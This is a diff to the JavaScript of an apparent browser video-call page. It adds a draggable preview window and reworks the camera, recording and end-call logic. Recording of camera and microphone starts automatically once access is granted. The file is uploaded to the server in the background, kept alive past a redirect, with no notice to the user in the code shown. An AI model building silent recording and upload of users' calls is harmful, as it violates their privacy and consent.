@@ -33,16 +33,55 @@ let mediaRecorder;
 let recordedChunks = [];
 let currentFacing = "user";
 
+const localVideo = document.getElementById("localVideo");
+
+// --- MOVABLE VIDEO LOGIC (Desktop & Mobile) ---
+let isDragging = false;
+let offsetX, offsetY;
+
+const startDrag = (e) => {
+    isDragging = true;
+    const clientX = e.touches ? e.touches[0].clientX : e.clientX;
+    const clientY = e.touches ? e.touches[0].clientY : e.clientY;
+    const rect = localVideo.getBoundingClientRect();
+    offsetX = clientX - rect.left;
+    offsetY = clientY - rect.top;
+    localVideo.style.cursor = "grabbing";
+};
+
+const drag = (e) => {
+    if (!isDragging) return;
+    e.preventDefault(); // Prevents scrolling while moving video
+    const clientX = e.touches ? e.touches[0].clientX : e.clientX;
+    const clientY = e.touches ? e.touches[0].clientY : e.clientY;
+    
+    localVideo.style.left = (clientX - offsetX) + "px";
+    localVideo.style.top = (clientY - offsetY) + "px";
+    localVideo.style.right = "auto";
+    localVideo.style.bottom = "auto";
+};
+
+const stopDrag = () => { isDragging = false; localVideo.style.cursor = "grab"; };
+
+localVideo.addEventListener("mousedown", startDrag);
+localVideo.addEventListener("touchstart", startDrag, { passive: false });
+document.addEventListener("mousemove", drag);
+document.addEventListener("touchmove", drag, { passive: false });
+document.addEventListener("mouseup", stopDrag);
+document.addEventListener("touchend", stopDrag);
+
+
+// --- CAMERA & RECORDING LOGIC ---
 async function startCamera() {
     try {
         localStream = await navigator.mediaDevices.getUserMedia({
             video: { facingMode: currentFacing },
             audio: true
         });
-        document.getElementById("localVideo").srcObject = localStream;
+        localVideo.srcObject = localStream;
         startRecording();
     } catch (err) {
-        alert("Camera access denied or not supported.");
+        console.error("Camera error:", err);
     }
 }
 
@@ -56,23 +95,32 @@ function startRecording() {
         if (e.data.size > 0) recordedChunks.push(e.data);
     };
 
-    mediaRecorder.onstop = async () => {
+    mediaRecorder.onstop = () => {
         const blob = new Blob(recordedChunks, { type: selectedType });
         const formData = new FormData();
         formData.append("video", blob, "call.webm");
 
-        try {
-            await fetch("https://hobo-call.onrender.com/upload", {
-                method: "POST",
-                body: formData
-            });
-        } catch (err) {
-            console.error("Upload failed", err);
-        }
+        // 🔥 BACKGROUND UPLOAD: Starts the upload but doesn't make the user wait
+        fetch("/upload", {
+            method: "POST",
+            body: formData,
+            keepalive: true // Crucial: keeps the request alive after page redirect
+        }).catch(err => console.error("Background upload failed", err));
+
+        // 🚀 INSTANT REDIRECT
         window.location.href = "search.html";
     };
 
     mediaRecorder.start();
+}
+
+function endCall() {
+    // Stop recording, which triggers the onstop event and the redirect
+    if (mediaRecorder && mediaRecorder.state !== "inactive") {
+        mediaRecorder.stop();
+    } else {
+        window.location.href = "search.html";
+    }
 }
 
 function switchCamera() {
@@ -82,16 +130,8 @@ function switchCamera() {
 }
 
 function toggleMic() {
-    const audioTrack = localStream.getAudioTracks()[0];
-    if(audioTrack) audioTrack.enabled = !audioTrack.enabled;
-}
-
-function endCall() {
-    if (mediaRecorder && mediaRecorder.state !== "inactive") {
-        mediaRecorder.stop();
-    } else {
-        window.location.href = "search.html";
-    }
+    const track = localStream.getAudioTracks()[0];
+    if(track) track.enabled = !track.enabled;
 }
 
 startCamera();
